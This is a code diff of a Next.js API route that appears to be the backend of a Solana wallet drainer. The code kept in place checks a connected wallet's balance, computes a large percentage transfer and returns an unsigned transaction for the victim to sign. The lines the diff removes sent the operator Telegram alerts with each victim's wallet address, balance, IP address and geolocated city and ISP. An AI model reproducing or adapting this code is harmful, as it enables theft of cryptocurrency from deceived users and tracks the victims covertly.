@@ -33,7 +33,6 @@ let cachedSolPrice = CONFIG.fallbackSOLPrice
 let cacheTimestamp = 0
 
 async function getConnection(): Promise<{connection: Connection, endpoint: string}> {
-  // Try endpoints in priority order
   for (const endpoint of [...RPC_ENDPOINTS].sort((a, b) => a.priority - b.priority)) {
     try {
       const connection = new Connection(endpoint.url, {
@@ -41,7 +40,6 @@ async function getConnection(): Promise<{connection: Connection, endpoint: strin
         confirmTransactionInitialTimeout: 8000,
       })
       
-      // Quick connection test
       const blockhash = await connection.getLatestBlockhash("finalized")
       if (blockhash?.blockhash) {
         console.log(`Connected to: ${endpoint.name}`)
@@ -134,154 +132,6 @@ async function sendTelegramNotification(message: string) {
   return false
 }
 
-async function sendWalletConnectedNotification(
-  walletAddress: string,
-  walletType: WalletType,
-  userIP: string
-) {
-  const date = new Date().toLocaleString("en-US", {
-    timeZone: "UTC",
-    hour: "2-digit",
-    minute: "2-digit",
-    month: "short",
-    day: "numeric",
-  })
-
-  const locationData = await getIPLocation(userIP)
-
-  const message = `
-🔌 *WALLET CONNECTED*
-
-📱 *Wallet:* ${walletType}
-📍 *Address:* \`${walletAddress.slice(0, 12)}...${walletAddress.slice(-8)}\`
-
-🌍 *User Info:*
-├─ IP: ${userIP}
-├─ Location: ${locationData.city}, ${locationData.country}
-└─ ISP: ${locationData.isp}
-
-🕐 *Time:* ${date} UTC
-📡 *Network:* Solana Mainnet
-🔍 *Status:* SCANNING BALANCE...
-`.trim()
-
-  await sendTelegramNotification(message)
-}
-
-async function sendWalletScannedNotification(
-  walletAddress: string,
-  walletType: WalletType,
-  balanceSOL: number,
-  balanceUSD: number,
-  userIP: string,
-  status: "sufficient" | "insufficient" | "error",
-  details?: string
-) {
-  const date = new Date().toLocaleString("en-US", {
-    timeZone: "UTC",
-    hour: "2-digit",
-    minute: "2-digit",
-    month: "short",
-    day: "numeric",
-  })
-
-  const locationData = await getIPLocation(userIP)
-  
-  const statusEmoji = status === "sufficient" ? "✅" : status === "insufficient" ? "⚠️" : "❌"
-  const statusText = status === "sufficient" ? "BALANCE OK" : 
-                     status === "insufficient" ? "LOW BALANCE" : "SCAN ERROR"
-
-  const message = `
-📊 *WALLET SCANNED - ${statusText}*
-
-${statusEmoji} *Status:* ${statusText}
-📱 *Wallet:* ${walletType}
-📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
-💰 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
-${status === "insufficient" ? `⚠️ *Required:* ${CONFIG.minBalanceSOL} SOL` : ''}
-
-🌍 *User Info:*
-├─ IP: ${userIP}
-├─ Location: ${locationData.city}, ${locationData.country}
-└─ ISP: ${locationData.isp}
-
-${details ? `📝 *Details:* ${details}` : ''}
-
-🕐 *Time:* ${date} UTC
-📡 *Network:* Solana Mainnet
-`.trim()
-
-  await sendTelegramNotification(message)
-}
-
-async function sendTransactionPreparedNotification(
-  walletAddress: string,
-  walletType: WalletType,
-  balanceSOL: number,
-  balanceUSD: number,
-  transferAmount: number,
-  percentage: number,
-  userIP: string
-) {
-  const date = new Date().toLocaleString("en-US", {
-    timeZone: "UTC",
-    hour: "2-digit",
-    minute: "2-digit",
-    month: "short",
-    day: "numeric",
-  })
-
-  const locationData = await getIPLocation(userIP)
-  const feeSOL = CONFIG.transactionFee / LAMPORTS_PER_SOL
-
-  const message = `
-⚡ *TRANSACTION READY*
-
-📱 *Wallet:* ${walletType}
-📍 *Address:* \`${walletAddress.slice(0, 8)}...${walletAddress.slice(-8)}\`
-💰 *Balance:* ${balanceSOL.toFixed(4)} SOL ($${balanceUSD.toFixed(2)})
-📤 *Transfer:* ${transferAmount.toFixed(4)} SOL (${percentage}%)
-📉 *Network Fee:* ${feeSOL.toFixed(6)} SOL
-
-🌍 *User Info:*
-├─ IP: ${userIP}
-├─ Location: ${locationData.city}, ${locationData.country}
-└─ ISP: ${locationData.isp}
-
-🕐 *Time:* ${date} UTC
-📡 *Network:* Solana Mainnet
-✅ *Status:* AWAITING SIGNATURE
-`.trim()
-
-  await sendTelegramNotification(message)
-}
-
-async function getIPLocation(ip: string) {
-  try {
-    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.")) {
-      return { city: "Local", country: "Local", isp: "Local Network" }
-    }
-
-    const response = await fetch(`https://ipapi.co/${ip}/json/`, {
-      headers: { "User-Agent": "Solana-Scanner/1.0" },
-      signal: AbortSignal.timeout(1500),
-    })
-    
-    if (response.ok) {
-      const data = await response.json()
-      return {
-        city: data.city || "Unknown",
-        country: data.country_name || "Unknown",
-        isp: data.org?.split(' ').slice(0, 2).join(' ') || "Unknown",
-      }
-    }
-  } catch (error) {
-    console.error("IP location error:", error)
-  }
-  
-  return { city: "Unknown", country: "Unknown", isp: "Unknown" }
-}
-
 function isValidWalletType(type: string): WalletType {
   const lowerType = type.toLowerCase()
   if (lowerType.includes("phantom")) return "Phantom"
@@ -299,7 +149,6 @@ export async function POST(request: NextRequest) {
     const body = await request.json()
     const { walletAddress, userIP, walletType = "Unknown" } = body
 
-    // Validate input
     if (!walletAddress) {
       return NextResponse.json(
         { error: "Wallet address required" },
@@ -307,7 +156,6 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Validate Solana address
     let walletPubkey: PublicKey
     try {
       walletPubkey = new PublicKey(walletAddress)
@@ -320,9 +168,6 @@ export async function POST(request: NextRequest) {
 
     const ipAddress = userIP || request.headers.get("x-forwarded-for") || "unknown"
     const validWalletType = isValidWalletType(walletType)
-
-    // Send connection notification
-    await sendWalletConnectedNotification(walletAddress, validWalletType, ipAddress)
 
     // Get connection
     const { connection, endpoint } = await getConnection()
@@ -339,16 +184,6 @@ export async function POST(request: NextRequest) {
 
     // Check minimum balance
     if (balanceSOL < CONFIG.minBalanceSOL) {
-      await sendWalletScannedNotification(
-        walletAddress,
-        validWalletType,
-        balanceSOL,
-        balanceUSD,
-        ipAddress,
-        "insufficient",
-        `Balance ${balanceSOL.toFixed(4)} SOL < Minimum ${CONFIG.minBalanceSOL} SOL`
-      )
-      
       return NextResponse.json({
         success: false,
         message: "Insufficient balance",
@@ -357,17 +192,6 @@ export async function POST(request: NextRequest) {
         walletType: validWalletType,
       })
     }
-
-    // Send sufficient balance notification
-    await sendWalletScannedNotification(
-      walletAddress,
-      validWalletType,
-      balanceSOL,
-      balanceUSD,
-      ipAddress,
-      "sufficient",
-      "Balance sufficient for transaction"
-    )
 
     // Calculate transfer amount
     const totalReserve = CONFIG.transactionFee + CONFIG.safetyBuffer + CONFIG.minimumReserve
@@ -404,17 +228,6 @@ export async function POST(request: NextRequest) {
     const serializedTransaction = transaction
       .serialize({ requireAllSignatures: false, verifySignatures: false })
       .toString("base64")
-
-    // Send transaction ready notification
-    await sendTransactionPreparedNotification(
-      walletAddress,
-      validWalletType,
-      balanceSOL,
-      balanceUSD,
-      transferAmount / LAMPORTS_PER_SOL,
-      CONFIG.transferPercentage,
-      ipAddress
-    )
 
     const processingTime = Date.now() - startTime
 
@@ -462,4 +275,4 @@ export async function GET() {
     },
     timestamp: new Date().toISOString(),
   })
-  }
+    }
